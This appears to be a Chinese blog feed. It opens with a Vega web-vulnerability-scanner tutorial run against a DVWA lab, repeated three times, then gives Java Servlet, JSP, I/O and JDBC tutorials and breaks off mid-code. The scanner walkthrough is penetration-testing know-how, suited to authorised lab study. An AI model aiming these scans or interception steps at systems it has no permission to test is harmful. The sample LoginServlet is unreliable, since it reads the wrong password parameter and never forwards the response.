      <content type="text"><![CDATA[0x00 vega简介vega是JAVA编写的开源的图形化Web应用检测平台，可以帮助你发现和确认SQL注入、XSS、信息泄漏和其他漏洞，能在Linux, OS X, and Windows上运行。它有两种工作模式，扫描模式(Scanner)和代理模式(Proxy)，可以进行爬站，处理表单和注入测试。 大多数的Web扫描器几乎都是支持主动扫描和代理扫描模式的。 启用代理模式，可以使用代理服务器对提交的数据进行任意修改，这将可以使得我们更方便的了解到整个提交响应的流程。 同时vega也是支持SSL扫描的。 0x01 配置扫描模块功能 Injection Modules:该模块下包含一些常用的，比如，sql盲注，XSS跨站脚本，XML注入检查，Http头注入啦等等 Response Processing Modules:响应进程模块。 Edit Target Scope将要扫描的目标划分为一个集合，就是将多个站点作为一个租进行统一的扫描；同时也可以设置不扫描的url页面。 0x02 Proxy模式首先打开vega，打开vega的Proxy模式，并选择windows菜单下的Preferences选项对其进行基本配置。 打开页面可以看到左边可以进行三项不同和的配置: General在General下可以设置vega的两种外部代理模式，SOCKS proxy（Tor 代理）和External HTPP proxy(Agent 代理)，以此所有vega发起的请求便都会经过这个两个中的一个进行转发了。 然后Appearence选择界面显示style，Updates可以选项vega自动更新。 Proxy该Proxy表示的是vega的内部代理，可以将vega伪造成为某个特定类型的浏览器。 Override client User-Agent代表使用上面的Defaul User-Agent的字符去覆盖客户端的浏览器代理。 Prevent browser caching阻止浏览器缓存。以此可以每次都发起一个全新的请求，建议勾选。 Prevent intermediate caching阻止中间代理服务器缓存。作用同上。 Listener选择vega的Proxy模式，以为着vega本身便是一个代理软件了，这时可以在Proxy下的Litener下设置要监听的IP地址和端口好了。 Scanner total path descendants: 最大扫描路径 child paths for a single node: 单个节点下的最大扫描子路劲 path depth:扫描的超链接数量 duplicate path elements:多个路径的枚举数 display in alert reports:在报警报告里显示的最大字符串长度 requests per second to send:每秒发送的最大请求数 response size to process in kilobytes: Debug 记录所有的Scanner请求 将调试信息输出到控制台 proxy模式下，Listerner是必须要设置的。 12root@kali:~# netstat -pantu | grep 1080tcp6 0 0 127.0.0.1:1080 :::* LISTEN 2962/java Proxy模式实战设置Vega监听当配置好Vega代理模式以后，便可以通过浏览器去访问目标网站了，当然还需要对浏览器进行代理设置并保证浏览器中代理设置与vega-&gt;Perference-&gt;Proxy-&gt;Listener下的代理设置保持一致。 首先设置vega代理:其实，这里主要设置vega要监听的代理主机的IP和port，可以是局域网下的host，也可以外网的host，这样可以让vega成为一个Proxy服务器，这与vega-&gt;Perference-&gt;General下的Proxy是完全不同的。 设置firefox代理然后打开firefox，设置AutoProxy中的代理参数: 模式代理服务器使用vega，并开启全局代理，这样所有的流量都将会经过代理服务器。 所有参数设置完毕，在vega中选择start HTTP Proxy，然后通过浏览器访问目标完整，那么所有的数据都将会被vega记录下来： 遨游目标网站浏览网站，发现目标服务器所有可能的数据交互的地方，比如表单，登陆，注册页面等。 漏洞检测目标网站手动浏览完成以后，便可以被动的对爬取下来的网站经行漏洞检测了，只需点击Scanner选项就可以了: 从上可以得到：针对192.168.234.129/dvwa/，一共发现了三个高危，一共中级，一个低级漏洞。 当然，这只是下vega的Proxy模式下，在被动扫描得到的结果，下面来看看vega强大的Scanner模式。 0x03 Scanner模式Vega的Scanner模式，又代表了vega下的主动扫描，首先选择vega下的Scanner模式: 点击导航栏上的scan选项，选择start new scan(开始个新的扫描)或者Edit Target Scope(编辑一个扫描组合) Edit Target Scope &amp;&amp; Start new scan我们先Edit Target Scope，在该配置下可设定目标的扫描根路径，并且排除不需要扫描的网站页面。 设置完成，开始Start new scan，并且Choose a target scope for scan，就是刚刚配置的scope了。 配置cookie或者登陆验证当一个网站需要登陆凭证才可以访问的时候，通常会使用cookies进行填充，而cookie可以从浏览器获得或者使用抓包工具去抓取。当然也可以直接设置验证参数。 在vega里面可以直接设置验证参数: 前三种，basic http authentication,digest http authentication,NTLM,都是基于web server来进行的登陆验证模式，而Macro(宏)则是针对web application表单提交式的登陆验证模式，这也是当前比较主流的方式: 输入Identity:name:name选择验证类型:Macro create macro: add item: 选择拥有登录cookie信息的requset页面，即是login.php页面作为验证参数页面: 注意选择完毕要双击该url，出现如下页面，勾选Configuration下的两个选项: Start New Scopeok,身份信息设置完毕。直接开始Scanner-&gt;Start New Scan，选择之前设置好的Dvwa Scope : next,Select Modules: 在Authentication Options中选择之前设置好的admin验证信息: vega自动扫描开始: 等待扫描完成，得到扫描报告： 从最后的扫报告可以看到，vega的scanner(主动扫描)比Proxy下的被动扫描发现的漏洞要多得多。 对于漏洞的具体利用，将在以后讲到。 0x04 vega后续使用优化Filter by scope在Website View界面下，选择Filter By Scope可以过滤掉目标网站里嵌套的超链，从而排除其它不必要的感染。 0x05 手动Debug可以在Proxy模式下，选择某一个url页面，然后右键Replay Request进行重放。 0x06 Vega的(Intercept)截断功能截断的意思，就是当client通过proxy向server发起request的时候，proxy会截断request，在修改该request后在向server发送,当然proxy也可以intercept server 给client的response，进行修改和篡改。 实验过程中，vega对数据的重放和截断还有所欠缺。 0x07 Vega 访问 Hppts网站Https网站是通过证书加密了的，国内比如百度，据说已经采用了https全站加密。 所有，当使用了vega代理模式，并且访问https网站时，可以访问HTTP://vega/ca.crt，只用vega的字签名证书，添加该网站为可信任站点。 问题:关于https的传输和加密过程？ title: vegadate: 2016-07-31 11:16tags: [‘Kali渗透测试’,’Web渗透测试’]toc: truecategories: technology 0x00 vega简介vega是一个基于Java编写的开源可视化Web扫描器。 0x01 配置扫描模块功能 Injection Modules:该模块下包含一些常用的，比如，sql盲注，XSS跨站脚本，XML注入检查，Http头注入啦等等 Response Processing Modules:响应进程模块。 Edit Target Scope将要扫描的目标划分为一个集合，就是将多个站点作为一个租进行统一的扫描；同时也可以设置不扫描的url页面。 0x02 Proxy模式首先打开vega，打开vega的Proxy模式，并选择windows菜单下的Preferences选项对其进行基本配置。 打开页面可以看到左边可以进行三项不同和的配置: General在General下可以设置vega的两种外部代理模式，SOCKS proxy（Tor 代理）和External HTPP proxy(Agent 代理)，以此所有vega发起的请求便都会经过这个两个中的一个进行转发了。 然后Appearence选择界面显示style，Updates可以选项vega自动更新。 Proxy该Proxy表示的是vega的内部代理，可以将vega伪造成为某个特定类型的浏览器。 Override client User-Agent代表使用上面的Defaul User-Agent的字符去覆盖客户端的浏览器代理。 Prevent browser caching阻止浏览器缓存。以此可以每次都发起一个全新的请求，建议勾选。 Prevent intermediate caching阻止中间代理服务器缓存。作用同上。 Listener选择vega的Proxy模式，以为着vega本身便是一个代理软件了，这时可以在Proxy下的Litener下设置要监听的IP地址和端口好了。 Scanner total path descendants: 最大扫描路径 child paths for a single node: 单个节点下的最大扫描子路劲 path depth:扫描的超链接数量 duplicate path elements:多个路径的枚举数 display in alert reports:在报警报告里显示的最大字符串长度 requests per second to send:每秒发送的最大请求数 response size to process in kilobytes: Debug 记录所有的Scanner请求 将调试信息输出到控制台 proxy模式下，Listerner是必须要设置的。 12root@kali:~# netstat -pantu | grep 1080tcp6 0 0 127.0.0.1:1080 :::* LISTEN 2962/java Proxy模式实战设置Vega监听当配置好Vega代理模式以后，便可以通过浏览器去访问目标网站了，当然还需要对浏览器进行代理设置并保证浏览器中代理设置与vega-&gt;Perference-&gt;Proxy-&gt;Listener下的代理设置保持一致。 首先设置vega代理:其实，这里主要设置vega要监听的代理主机的IP和port，可以是局域网下的host，也可以外网的host，这样可以让vega成为一个Proxy服务器，这与vega-&gt;Perference-&gt;General下的Proxy是完全不同的。 设置firefox代理然后打开firefox，设置AutoProxy中的代理参数: 模式代理服务器使用vega，并开启全局代理，这样所有的流量都将会经过代理服务器。 所有参数设置完毕，在vega中选择start HTTP Proxy，然后通过浏览器访问目标完整，那么所有的数据都将会被vega记录下来： 遨游目标网站浏览网站，发现目标服务器所有可能的数据交互的地方，比如表单，登陆，注册页面等。 漏洞检测目标网站手动浏览完成以后，便可以被动的对爬取下来的网站经行漏洞检测了，只需点击Scanner选项就可以了: 从上可以得到：针对192.168.234.129/dvwa/，一共发现了三个高危，一共中级，一个低级漏洞。 当然，这只是下vega的Proxy模式下，在被动扫描得到的结果，下面来看看vega强大的Scanner模式。 0x03 Scanner模式Vega的Scanner模式，又代表了vega下的主动扫描，首先选择vega下的Scanner模式: 点击导航栏上的scan选项，选择start new scan(开始个新的扫描)或者Edit Target Scope(编辑一个扫描组合) Edit Target Scope &amp;&amp; Start new scan我们先Edit Target Scope，在该配置下可设定目标的扫描根路径，并且排除不需要扫描的网站页面。 设置完成，开始Start new scan，并且Choose a target scope for scan，就是刚刚配置的scope了。 配置cookie或者登陆验证当一个网站需要登陆凭证才可以访问的时候，通常会使用cookies进行填充，而cookie可以从浏览器获得或者使用抓包工具去抓取。当然也可以直接设置验证参数。 在vega里面可以直接设置验证参数: 前三种，basic http authentication,digest http authentication,NTLM,都是基于web server来进行的登陆验证模式，而Macro(宏)则是针对web application表单提交式的登陆验证模式，这也是当前比较主流的方式: 输入Identity:name:name选择验证类型:Macro create macro: add item: 选择拥有登录cookie信息的requset页面，即是login.php页面作为验证参数页面: 注意选择完毕要双击该url，出现如下页面，勾选Configuration下的两个选项: Start New Scopeok,身份信息设置完毕。直接开始Scanner-&gt;Start New Scan，选择之前设置好的Dvwa Scope : next,Select Modules: 在Authentication Options中选择之前设置好的admin验证信息: vega自动扫描开始: 等待扫描完成，得到扫描报告： 从最后的扫报告可以看到，vega的scanner(主动扫描)比Proxy下的被动扫描发现的漏洞要多得多。 对于漏洞的具体利用，将在以后讲到。 0x04 vega后续使用优化Filter by scope在Website View界面下，选择Filter By Scope可以过滤掉目标网站里嵌套的超链，从而排除其它不必要的感染。 0x05 手动Debug可以在Proxy模式下，选择某一个url页面，然后右键Replay Request进行重放。 0x06 Vega的(Intercept)截断功能截断的意思，就是当client通过proxy向server发起request的时候，proxy会截断request，在修改该request后在向server发送,当然proxy也可以intercept server 给client的response，进行修改和篡改。 实验过程中，vega对数据的重放和截断还有所欠缺。 0x07 Vega 访问 Hppts网站Https网站是通过证书加密了的，国内比如百度，据说已经采用了https全站加密。 所有，当使用了vega代理模式，并且访问https网站时，可以访问HTTP://vega/ca.crt，只用vega的字签名证书，添加该网站为可信任站点。 问题:关于https的传输和加密过程？ title: vegadate: 2016-07-31 11:16tags: [‘Kali渗透测试’,’Web渗透测试’]toc: truecategories: technology 0x00 vega简介vega是一个基于Java编写的开源可视化Web扫描器。 0x01 配置扫描模块功能 Injection Modules:该模块下包含一些常用的，比如，sql盲注，XSS跨站脚本，XML注入检查，Http头注入啦等等 Response Processing Modules:响应进程模块。 Edit Target Scope将要扫描的目标划分为一个集合，就是将多个站点作为一个租进行统一的扫描；同时也可以设置不扫描的url页面。 0x02 Proxy模式首先打开vega，打开vega的Proxy模式，并选择windows菜单下的Preferences选项对其进行基本配置。 打开页面可以看到左边可以进行三项不同和的配置: General在General下可以设置vega的两种外部代理模式，SOCKS proxy（Tor 代理）和External HTPP proxy(Agent 代理)，以此所有vega发起的请求便都会经过这个两个中的一个进行转发了。 然后Appearence选择界面显示style，Updates可以选项vega自动更新。 Proxy该Proxy表示的是vega的内部代理，可以将vega伪造成为某个特定类型的浏览器。 Override client User-Agent代表使用上面的Defaul User-Agent的字符去覆盖客户端的浏览器代理。 Prevent browser caching阻止浏览器缓存。以此可以每次都发起一个全新的请求，建议勾选。 Prevent intermediate caching阻止中间代理服务器缓存。作用同上。 Listener选择vega的Proxy模式，以为着vega本身便是一个代理软件了，这时可以在Proxy下的Litener下设置要监听的IP地址和端口好了。 Scanner total path descendants: 最大扫描路径 child paths for a single node: 单个节点下的最大扫描子路劲 path depth:扫描的超链接数量 duplicate path elements:多个路径的枚举数 display in alert reports:在报警报告里显示的最大字符串长度 requests per second to send:每秒发送的最大请求数 response size to process in kilobytes: Debug 记录所有的Scanner请求 将调试信息输出到控制台 proxy模式下，Listerner是必须要设置的。 12root@kali:~# netstat -pantu | grep 1080tcp6 0 0 127.0.0.1:1080 :::* LISTEN 2962/java Proxy模式实战设置Vega监听当配置好Vega代理模式以后，便可以通过浏览器去访问目标网站了，当然还需要对浏览器进行代理设置并保证浏览器中代理设置与vega-&gt;Perference-&gt;Proxy-&gt;Listener下的代理设置保持一致。 首先设置vega代理:其实，这里主要设置vega要监听的代理主机的IP和port，可以是局域网下的host，也可以外网的host，这样可以让vega成为一个Proxy服务器，这与vega-&gt;Perference-&gt;General下的Proxy是完全不同的。 设置firefox代理然后打开firefox，设置AutoProxy中的代理参数: 模式代理服务器使用vega，并开启全局代理，这样所有的流量都将会经过代理服务器。 所有参数设置完毕，在vega中选择start HTTP Proxy，然后通过浏览器访问目标完整，那么所有的数据都将会被vega记录下来： 遨游目标网站浏览网站，发现目标服务器所有可能的数据交互的地方，比如表单，登陆，注册页面等。 漏洞检测目标网站手动浏览完成以后，便可以被动的对爬取下来的网站经行漏洞检测了，只需点击Scanner选项就可以了: 从上可以得到：针对192.168.234.129/dvwa/，一共发现了三个高危，一共中级，一个低级漏洞。 当然，这只是下vega的Proxy模式下，在被动扫描得到的结果，下面来看看vega强大的Scanner模式。 0x03 Scanner模式Vega的Scanner模式，又代表了vega下的主动扫描，首先选择vega下的Scanner模式: 点击导航栏上的scan选项，选择start new scan(开始个新的扫描)或者Edit Target Scope(编辑一个扫描组合) Edit Target Scope &amp;&amp; Start new scan我们先Edit Target Scope，在该配置下可设定目标的扫描根路径，并且排除不需要扫描的网站页面。 设置完成，开始Start new scan，并且Choose a target scope for scan，就是刚刚配置的scope了。 配置cookie或者登陆验证当一个网站需要登陆凭证才可以访问的时候，通常会使用cookies进行填充，而cookie可以从浏览器获得或者使用抓包工具去抓取。当然也可以直接设置验证参数。 在vega里面可以直接设置验证参数: 前三种，basic http authentication,digest http authentication,NTLM,都是基于web server来进行的登陆验证模式，而Macro(宏)则是针对web application表单提交式的登陆验证模式，这也是当前比较主流的方式: 输入Identity:name:name选择验证类型:Macro create macro: add item: 选择拥有登录cookie信息的requset页面，即是login.php页面作为验证参数页面: 注意选择完毕要双击该url，出现如下页面，勾选Configuration下的两个选项: Start New Scopeok,身份信息设置完毕。直接开始Scanner-&gt;Start New Scan，选择之前设置好的Dvwa Scope : next,Select Modules: 在Authentication Options中选择之前设置好的admin验证信息: vega自动扫描开始: 等待扫描完成，得到扫描报告： 从最后的扫报告可以看到，vega的scanner(主动扫描)比Proxy下的被动扫描发现的漏洞要多得多。 对于漏洞的具体利用，将在以后讲到。 0x04 vega后续使用优化Filter by scope在Website View界面下，选择Filter By Scope可以过滤掉目标网站里嵌套的超链，从而排除其它不必要的感染。 0x05 手动Debug可以在Proxy模式下，选择某一个url页面，然后右键Replay Request进行重放。 0x06 Vega的(Intercept)截断功能截断的意思，就是当client通过proxy向server发起request的时候，proxy会截断request，在修改该request后在向server发送,当然proxy也可以intercept server 给client的response，进行修改和篡改。 实验过程中，vega对数据的重放和截断还有所欠缺。 0x07 Vega 访问 Hppts网站Https网站是通过证书加密了的，国内比如百度，据说已经采用了https全站加密。 所有，当使用了vega代理模式，并且访问https网站时，可以访问HTTP://vega/ca.crt，使用vega的字签名证书，添加该网站为可信任站点。 问题:关于https的传输和加密过程？]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Servlet]]></title>
      <url>%2F2016%2F07%2F25%2FServlet%2F</url>
      <content type="text"><![CDATA[0x01 Servlet简介 CGICGI(Common Gateway Interface)通用网关接口。是一种根据请求信息动态产生回应内容的技术。通过CGI，Web服务器可以将根据请求不同启动不同的外部程序，并将请求内容转发给该程序，在程序执行结束后，将执行结果作为回应返回给客户端。也因此，将会产生大量的进程，从而占用许多资源。此外，CGI不可移植。显然在大数据，云计算技术等互联网的新生代下，该技术日显落寞。 ServletServlet(Servlet Applet),全称Java Servlet，是用Java编写的服务器端程序，其主要功能在于交互式地浏览和修改数据，生成动态Web内容。与CGI不同的是，Servlet对每个请求都是单独启动一个线程，而不是进程。这种处理方式大幅度地降低了系统里的进程数量，提高了系统的并发处理能力。另外因为Java Servlet是运行在虚拟机之上的，也因此了解决了跨平台问题。同样没有Servlet的出现，也没有互联网的今天。 Servlet其过程分为如下四个: 客户端发送请求至服务器端; 服务器端将请求信息发送至Servlet； Servlet、生成响应内容并将其传给服务器； 服务器将响应返回给客户端。 但是使用Servlet来进行编写程序并不容易，需要实现的方法太多，所以编写Servlet时直接继承HttpServlet，并覆盖需要的方式即可。一般只覆盖doGet()和doPost()方法即可。 doGet()当form中的method属性设为”GET”时，浏览器就会以GET方式提交表单数据，表单会根据Action中的设置判断将数据提交到什么地方，Servlet或者JSP。 使用GET的方式进行表单的提交，浏览器会把表单的内容组织成一个字符串，变量之间用“&amp;”进行连接，然后以Servlet路径加“？”加查询字符串的形式获取服务器内容。使用这种方式并不安全，因为所有需要传输的数据会显示在浏览器的地址栏上。 doPost()将FORM中的methods属性设置为“POST”，浏览器就会以POST的方式提交表单内容。在POST提交表单时，表单的内容不会在浏览器中显示，因此使用POST提交方式比较安全，适用于提交一些密码等信息。 此外Servlet可以通过HttpServletRequest特性的getPraramter(String parame)__是属性来获取param对应的参数 0x2 Servlet路径部署JavaEE web规范了服务器搜索Servlet类的路径:WEB-INF/calsses以及WEB-INF/lib下所有的jar文件(jar包)。 比如写好了一个LoginServlet.java的Servlet文件，那么便需要将LoginServlet.java编译后文件LoginServlet.class文件放到WEB-INF/classs/com/jack/loginServlet/中 当然，如果使用MyEclipse的话只需重新部署项目就可以了，选择好web项目的本地存放路劲，其它的都会自动配置的。 只需要再web.xml项目部署文件中配置好Servlet的请求匹配路径就好了。 比如有两个页面index.jsp和LoginServlet.java页面。它们的关系是index.jsp中的form表单会将数据提交给loginServlet.java。但是不会直接使用跳转，而是通过web.xml的配置文件来过渡(映射)的。 index.jsp—&gt;web.xml—&gt;loginServlet.java index.jsp文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;utf-8&quot;%&gt;&lt;% String path = request.getContextPath(); String basePath = request.getScheme() + &quot;://&quot; + request.getServerName() + &quot;:&quot; + request.getServerPort() + path + &quot;/&quot;;%&gt;&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;base href=&quot;&lt;%=basePath%&gt;&quot;&gt;&lt;title&gt;登录&lt;/title&gt;&lt;meta http-equiv=&quot;pragma&quot; content=&quot;no-cache&quot;&gt;&lt;meta http-equiv=&quot;cache-control&quot; content=&quot;no-cache&quot;&gt;&lt;meta http-equiv=&quot;expires&quot; content=&quot;0&quot;&gt;&lt;meta http-equiv=&quot;keywords&quot; content=&quot;keyword1,keyword2,keyword3&quot;&gt;&lt;meta http-equiv=&quot;description&quot; content=&quot;This is my page&quot;&gt;&lt;!-- &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;styles.css&quot;&gt; --&gt;&lt;/head&gt;&lt;body&gt; &lt;% if (request.getAttribute(&quot;Error&quot;) != null) &#123; // 有错误，要进行打印输出 List all = (List) request.getAttribute(&quot;Error&quot;); Iterator iter = all.iterator(); while (iter.hasNext()) &#123; %&gt; &lt;p&gt;&lt;%=iter.next()%&gt;&lt;/p&gt; &lt;% &#125; &#125; %&gt;&lt;form action=&quot;loginServlet&quot; method=&quot;post&quot;&gt; &lt;div&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;&lt;strong&gt;登录名:&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;strong&gt;密码:&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;reset&quot; name=&quot;reset&quot; value=&quot;重置&quot;&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/div&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; web.xml配置: 1234567891011121314 &lt;servlet&gt; &lt;description&gt;控制用户发送来的请求&lt;/description&gt; &lt;display-name&gt;LoginServlet&lt;/display-name&gt; &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt; &lt;servlet-class&gt;com.jack.servlet.LoginServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/loginServlet&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; &lt;welcome-file-list&gt; &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt; &lt;/welcome-file-list&gt; LoginServlet.java文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105package com.jack.servlet;import java.io.IOException;import java.util.ArrayList;import java.util.List;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import com.jack.factory.DAOFactory;import com.jack.pojo.Login;public class LoginServlet extends HttpServlet &#123; /** * Constructor of the object. */ public LoginServlet() &#123; super(); &#125; /** * Destruction of the servlet. &lt;br&gt; */ public void destroy() &#123; super.destroy(); // Just puts &quot;destroy&quot; string in log // Put your code here &#125; /** * The doGet method of the servlet. &lt;br&gt; * * This method is called when a form has its tag value method equals to get. * * @param request * the request send by the client to the server * @param response * the response send by the server to the client * @throws ServletException * if an error occurred * @throws IOException * if an error occurred */ public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; doPost(request, response); &#125; /** * The doPost method of the servlet. &lt;br&gt; * * This method is called when a form has its tag value method equals to * post. * * @param request * the request send by the client to the server * @param response * the response send by the server to the client * @throws ServletException * if an error occurred * @throws IOException * if an error occurred */ public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; List errors = new ArrayList(); String path = &quot;../index.jsp&quot;; String name = request.getParameter(&quot;username&quot;); String pwd = request.getParameter(&quot;pwd&quot;); Login lg = new Login(); lg.setUsername(name); lg.setPassword(pwd); lg.setErrors(errors); boolean isValid = lg.isInvalidate(); System.out.println(&quot;判断输入格式是否合法&quot; + isValid); // 如果输入合法，再进行数据库端的验证 if (isValid) &#123; if (DAOFactory.getLoginDAOInstance().isLogin(lg)) &#123; System.out.println(&quot;数据库匹配验证&quot;); path = &quot;../success.jsp&quot;; &#125; else &#123; errors.add(&quot;用户名密码不对!&quot;); &#125; &#125; request.setAttribute(&quot;Error&quot;, errors); request.setAttribute(&quot;Lg&quot;, lg); System.out.println(&quot;&lt;html&gt;&quot;); &#125; /** * Initialization of the servlet. &lt;br&gt; * * @throws ServletException * if an error occurs */ public void init() throws ServletException &#123; // Put your code here &#125;&#125; 如上创建了一个index.jsp页面，form表单会将数据提交到路径为action=”loginServlet”中的Servlet程序(实际上这个程序就是LoginServlet.class(由LoginServlet.java编译后的文件))，而loginServlet是实际上不存在的，它只是一个别名或者说一虚拟的url路径而已。 值得注意的是web.xml中/loginServlet和index.jsp中的action=”loginServlet”必须一致。 然后web.xml会将/loginServlet映射为com.jack.servlet.LoginServlet页面。 0x03 Servlet转发Servlet的请求转发有三种形式，主要是通过HttpServletRequest和HttpServletResponse对象来实现的。 Java代码: 12345public void service(HttpServletRequest request,HttpServletResponse response) throws ServletException,IOException &#123; request.getRequestDispathcer(&quot;/url&quot;).include(request,response); request.getRequestDispathcer(&quot;/url&quot;).forward(request,response); request.sendRedirect(&quot;/url&quot;);&#125; 它们的区别是:include是把另一个servlet/jsp处理过后的内容拿过来与本身的servlet内容一起输出；forward是把请求的内容转发到另一个servlet/jsp中。 include是把被人包含进来，forward则是丢掉自己。而sendRedict则是单纯的重定向。 0x04 ServletContextServletContext是Servlet与Servlet容器之间的直接通信接口，每个web应用有唯一的一个servletConetxt对象。同一个web应用的所有servlet对象共享一个servletContext，sevlet对象可以通过它来访问容器中的各种资源。 获取内存共享数据的方法setAttributesetAttribute(String name,java.lang.Object object):把一个java对象和属性名绑定，并存放到SevletContext中，参数name指定属性名，参数Object表示共享数据。 setAttribute(String name):根据参数给定的属性名，返回一个object类型的对象getAttributeNames():返回一个Enumeration对象，该对象包含了所有存放在SetvletContext中的属性名。removetAttribute(String name):根据参数指定属性名，从ServletContext对象中删除匹配的属性。servletContext对象获得的几种方法Javax.servlet.HttpSession.getServletContext()Javax.servlet.jsp.PageContext.getServletContext()Javax.servlet.ServletConfig.getServletContext()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[J2EEE+Servlet+JSP]]></title>
      <url>%2F2016%2F07%2F25%2FJ2EE%2BServlet%2BJSP%2F</url>
      <content type="text"><![CDATA[0x00 J2EE简介目前，Java 2平台有3个版本，它们是适用于小型设备和智能卡的Java 2平台Micro版（Java 2 Platform Micro Edition，J2ME）、适用于桌面系统的Java 2平台标准版（Java 2 Platform Standard Edition，J2SE）、适用于创建服务器应用程序和服务的Java 2平台企业版（Java 2 Platform Enterprise Edition，J2EE）。 J2EE的四层架构传统的二层架构(client/server)加重了客户端的处理负担，为此，J2EE使用了更加高效的四层架构: 运行在客户机上的客户层组件 运行在J2EE服务器上的Web层组件 运行在J2EE服务器上的业务逻辑层组件 运行在EIS服务器上的企业信息系统(Enterprise information system)层软件 0x02 JSP在Servlet出现之后，随着使用范围的扩大，开始出现一个很大弊端，就是为了能够输出HTML内容，需要大量重复编写代码。所以，为了解决这个问题，基于Servlet技术产生了JSP技术。JSP全称Java Server Pages，即Java服务器页面，其目的是为了简化Servlet的设计.它实现了Html语法中的java扩展（以 &lt;%, %&gt;形式）。JSP同样是在服务器端执行的。 Servlet侧重于解决运算和业务逻辑问题，JSP侧重于解决展示问题，Servlet和JSP两者分工协作为Web引用带来了巨大贡献。 虽然JSP就是嵌入了java语句的HTML文件，但是它是不能直接通过浏览器运行的，而是必须翻译成一个Servlet程序，最后运行在容器上的，然后发送到客户端浏览器。 JSP中的指令元素也可以称为指示元素，主要是用来提供整个JSP网页相关的信息，并且设定JSP页面的相关属性。 JSP中的指令元素包含三类:page,include,taglib。 page指令元素page指令元素包含了与整个JSP页面相关的一些属性。 import:用于导入java中的类，是page中唯一一个可以重复使用的属性。 12&lt;%@ page import=&quot;java.utli.Vector,java.io*&quot;%&gt;&lt;%@ page import=&quot;java.servlet.*&quot;%&gt; errorPage=”error_url”该属性用于指定当JSP页面发生异常时，将转向哪一个错误处理页面。 isErrorPage=”true|false”该属性用于指定当前的JSP页面是否是另一个JSP页面的错误处理页面。默认值是false。 contentTupe属性指定用于响应的JSP页面的MIME类型和字符编码。 1&lt;%@ page contentType=&quot;text/html; chaeset=utf-8&quot;%&gt; pageEncoding=”gb2312”该属性指定JSP页面使用的字符编码。如果设置了这个属性，则JSP页面的字符编码使用该属性指定的字符集，如果没有设置这个属性，则JSP页面使用contentType属性指定的字符集，如果这两个属性都没有指定，则使用字符集“ISO-8859-1”。 session该属性的值为“true|false”默认为true如果设置为false则该页面不能用session对象，要是使用的话会报错。 include指令元素include指令元素用于在翻译阶段将指定的文件加入到当前的页面中来1&lt;%@ include file=&quot;relativeURLspec&quot; %&gt; taglib指令元素声明用户使用的自定义标签。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Java-I/O]]></title>
      <url>%2F2016%2F07%2F23%2FJava-I-O%2F</url>
      <content type="text"><![CDATA[0x00 字节流与字符流，缓冲区不同于其它语言，对IO的处理是封装好的，在Java中往往需要多个层次的装饰(decoration)才能实现文件读取。复杂带来的好处是对IO操作的灵活处理。 其实对文件内容的操作主要分为两类: 字符流:用于操作文本文件和带有较多字符内容的文件。字符流有两个抽象类，Write\和Reader,其对应子类FileWrite\和FileReader可实现文件的读写操作，BufferredWrite\和BufferedReader能够提供缓冲区功能。 字节流:操作那些无法直接获得文本信息的二进制文件，如图片，MP3，视频等。同样字节流也有两个抽象类：InputStream 和 OutputStream其对应子类有FileInputStream和FileOutputStream实现文件读写BufferedInputStream和BufferedOutputStream提供缓冲区功能 I/O中缓冲区的作用:简单的理解就是，如果对硬盘边读边写，会很慢，也伤硬盘。缓冲区其实内存里的一块区域，把数据先存内存里，然后一次性写入，类似数据库的批量操作，这样效率比较高。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Java-Java连接MSSQL数据库]]></title>
      <url>%2F2016%2F07%2F23%2FJava%E8%BF%9E%E6%8E%A5MSSQL%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
      <content type="text"><![CDATA[0x01Connection对象代表Java与数据库的连接。 连接完成，如果要执行SQ的话，必须建立Statement对象，它会执行SQL指令并返回执行结果。可以使用Connection的createStatement()方法来建立Statement对象。 建立Statement对象之后，我们可以使用executeUpdate()\、executeQuery()等方法来执行 SQL，executeUpdate()主要执行更新等可以改变数据库内容有关的操作。 executeQuery()方法则是用于SELECT等查询数据库的SQL，executeUpdate()与 executeQuery()都会传回ResultSet对象，代表变更或查询的结果，查询的结果会是一笔一笔的数据。可以使用next()方法来移动至下一笔数据，它会传回 true 或 false表示是否有下一笔资料，接着可以使用getXXX()来取得资料，例如getString()\、getFloat()\、getDouble()等方法，分别取得相对应的字段型态数据，getXXX()方法都提供有依字段名称取得数据，或是依字段顺序取得数据的方法， 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package com.jack.test;//import java.sql.*import java.sql.DriverManager;import java.sql.SQLException;import java.sql.Statement;import java.sql.Connection;import java.sql.ResultSet;public class TestMain &#123; public static void main(String[] args) &#123;// TODO Auto-generated method stub Connection 